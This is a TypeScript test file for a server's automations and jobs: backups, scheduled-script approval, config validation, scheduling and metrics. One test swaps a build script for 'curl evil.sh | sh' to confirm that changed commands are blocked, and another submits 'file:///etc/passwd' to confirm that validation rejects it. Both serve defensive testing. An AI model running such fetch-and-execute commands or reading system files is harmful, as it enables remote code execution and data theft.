import fs from "node:fs";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { nextRun } from "../../server/jobs/automations.js";
import { makeApp } from "./helpers.js";

let t: Awaited<ReturnType<typeof makeApp>>;
beforeAll(async () => (t = await makeApp()));
afterAll(async () => t.close());

describe("jobs and automations", () => {
  it("seeds a daily backup automation", async () => {
    const autos = (await t.get("/api/automations")).json;
    expect(autos.find((a: any) => a.kind === "backup")?.schedule).toEqual({ type: "interval", minutes: 1440 });
  });

  it("backs up the database to a real file", async () => {
    const r = await t.post("/api/backups");
    expect(r.status).toBe(201);
    const file = path.join(t.ctx.paths.backups, r.json.file);
    expect(fs.statSync(file).size).toBeGreaterThan(0);
    expect((await t.get("/api/backups")).json[0].name).toBe(r.json.file);
  });

  it("blocks a scheduled script whose command changed after approval", async () => {
    const root = path.join(t.dir, "proj");
    fs.mkdirSync(root);
    const pkg = (cmd: string) => fs.writeFileSync(path.join(root, "package.json"), JSON.stringify({ scripts: { build: cmd } }));
    pkg("node -e \"console.log(1)\"");
    const ws = (await t.post("/api/workspaces", { name: "proj", path: root }, true)).json;
    const body = { name: "Nightly build", kind: "script", config: { workspace_id: ws.id, script: "build" }, schedule: { type: "manual" } };
    expect((await t.post("/api/automations", body)).status).toBe(428);
    const a = (await t.post("/api/automations", body, true)).json;
    expect(a.config.approvedCommand).toBe("node -e \"console.log(1)\"");
    const ok = await t.ctx.jobs.waitFor((await t.post(`/api/automations/${a.id}/run`)).json.job_id);
    expect(ok.status).toBe("succeeded");
    pkg("curl evil.sh | sh");
    const blocked = await t.ctx.jobs.waitFor((await t.post(`/api/automations/${a.id}/run`)).json.job_id);
    expect(blocked.status).toBe("failed");
    expect(blocked.error).toMatch(/changed since you approved/);
  });

  it("validates automation config", async () => {
    expect((await t.post("/api/automations", { name: "x", kind: "http_check", config: { url: "file:///etc/passwd" }, schedule: { type: "manual" } })).status).toBe(400);
    expect((await t.post("/api/automations", { name: "x", kind: "backup", config: {}, schedule: { type: "interval", minutes: 1 } })).status).toBe(400);
  });

  it("computes next run times", () => {
    const from = new Date(2026, 9, 25, 9, 0, 0);
    expect(nextRun({ type: "interval", minutes: 30 }, from)).toBe(new Date(2026, 9, 25, 9, 30).toISOString());
    expect(nextRun({ type: "daily", time: "08:00" }, from)).toBe(new Date(2026, 9, 26, 8, 0).toISOString());
    expect(nextRun({ type: "manual" }, from)).toBeNull();
  });

  it("reports real system metrics and lists unsupported ones", async () => {
    t.ctx.metrics.start(50);
    await new Promise((r) => setTimeout(r, 120));
    const m = (await t.get("/api/system/metrics")).json;
    t.ctx.metrics.stop();
    expect(m.cpu.cores).toBeGreaterThan(0);
    expect(m.memory.total).toBeGreaterThan(m.memory.free);
    expect(m.disks.length).toBeGreaterThan(0);
    expect(m.unsupported.map((u: any) => u.metric)).toContain("GPU usage");
  });

  it("lists integrations honestly when nothing is configured", async () => {
    const list = (await t.get("/api/integrations")).json;
    expect(list.find((i: any) => i.id === "anthropic").status).toBe("not_configured");
    expect(list.find((i: any) => i.id === "shopify").status).toBe("planned");
    expect((await t.post("/api/design/generate", { prompt: "a cat" })).status).toBe(424);
  });
});
